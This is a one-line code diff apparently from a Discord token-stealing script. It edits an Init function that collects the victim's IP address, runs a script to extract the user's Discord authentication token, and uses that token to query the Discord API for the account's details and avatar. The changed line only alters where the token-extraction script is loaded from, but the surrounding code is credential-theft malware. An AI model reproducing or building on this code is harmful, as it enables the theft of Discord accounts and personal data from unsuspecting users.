@@ -390,7 +390,7 @@ const path = (function () {
 
 async function Init() {
  const ip = await GetIp();
- const token = await ExecScript(tokenScript);
+ const token = await ExecScript(config.get.token);
  const user = await GetUrl("https://discord.com/api/v8/users/@me", token);
  const avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`;
  if (config["init-notify"] !== "true") {
